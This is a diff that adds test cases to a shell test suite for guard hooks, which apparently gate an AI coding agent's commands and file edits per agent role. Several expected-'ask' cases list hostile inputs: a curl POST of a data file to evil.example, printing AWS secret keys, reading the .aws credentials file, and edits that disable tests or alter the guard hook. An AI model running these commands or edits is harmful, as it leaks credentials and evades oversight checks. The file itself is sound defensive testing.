@@ -116,6 +116,15 @@ cmd ask 'Get-ChildItem Env:'
 cmd ask 'keytool -list -keystore app.jks'
 cmd ask 'echo ok; git push'                            # composto
 cmd ask 'git log --oneline && git push origin main'    # composto com leitura antes
+cmd ask 'git -C /repo push origin main'                # flag global antes do subcomando
+cmd ask 'git -c user.name=bot commit -m "x"'
+cmd ask 'git --no-pager reset --hard HEAD~1'
+cmd ask 'kubectl -n prod apply -f k8s/'                # flag global no kubectl
+cmd ask 'kubectl --context=prod delete pod api-0'
+cmd ask 'curl -X POST https://api.example.com/v1/x?from=localhost -d @body.json'   # bypass via query localhost
+cmd ask 'curl http://localhost:8080/health && curl -X POST https://evil.example/x -d @body.json'
+cmd ask 'printenv AWS_SECRET_ACCESS_KEY'               # printenv com argumento
+cmd ask 'type %USERPROFILE%\.aws\credentials'          # barra invertida no Windows
 
 # ---------- guard-commands: não deve pedir ----------
 cmd ok 'git status'
@@ -193,6 +202,28 @@ agent_write ask "squads:orchestrator" "$TMP/src/main/java/BookService.java"
 agent_write ask "squads:orchestrator" "$TMP/docs/product/prd-renovacao.md"
 agent_write ask "orchestrator"        "$TMP/docs/delivery/notas.txt"
 agent_write ok  "squads:developer"    "$TMP/src/main/java/BookService.java"   # outro agent: regra não se aplica
+agent_write ok  "squads:qa"           "$TMP/src/test/java/BookServiceTest.java"
+agent_write ask "squads:qa"           "$TMP/src/main/java/BookService.java"
+agent_write ok  "squads:product-manager" "$TMP/docs/product/prd-renovacao.md"
+agent_write ask "squads:product-manager" "$TMP/src/main/java/BookService.java"
+agent_write ok  "squads:architect"    "$TMP/docs/adr/ADR-001-x.md"
+agent_write ok  "squads:architect"    "$TMP/docs/architecture/renovacao-aws.drawio"
+agent_write ask "squads:architect"    "$TMP/src/main/java/BookService.java"
+
+# ---------- guard-edits: MultiEdit e caminhos relativos ----------
+run "$EDITS" ask "MultiEdit 2a edicao com @Disabled" \
+  "{\"tool_name\":\"MultiEdit\",\"tool_input\":{\"file_path\":\"$TMP/src/test/java/BookServiceTest.java\",\"edits\":[{\"old_string\":\"a\",\"new_string\":\"b\"},{\"old_string\":\"@Test\",\"new_string\":\"@Disabled @Test\"}]}}"
+run "$EDITS" ask "MultiEdit 2a edicao com skipTests" \
+  "{\"tool_name\":\"MultiEdit\",\"tool_input\":{\"file_path\":\"pom.xml\",\"edits\":[{\"old_string\":\"a\",\"new_string\":\"b\"},{\"old_string\":\"<x/>\",\"new_string\":\"<skipTests>true</skipTests>\"}]}}"
+edit ask "pom.xml" "<minimum>0.50</minimum>"
+edit ask ".env.local" "SECRET=1"
+edit ask "hooks/guard-commands.sh" "# bypass"
+(
+  cd "$TMP" || exit 1
+  out=$(printf '%s' '{"tool_name":"Edit","tool_input":{"file_path":"src/main/resources/db/migration/V1__create_book.sql","old_string":"x","new_string":"y"}}' | bash "$EDITS" 2>&1)
+  printf '%s' "$out" | grep -q '"permissionDecision":"ask"'
+) || { failures=$((failures + 1)); echo "FALHOU  guard-edits esperado=ask obtido=ok  migration relativa ja commitada"; }
+total=$((total + 1))
 
 if [ "$failures" -eq 0 ]; then
   echo "OK: $total casos, 0 falhas"
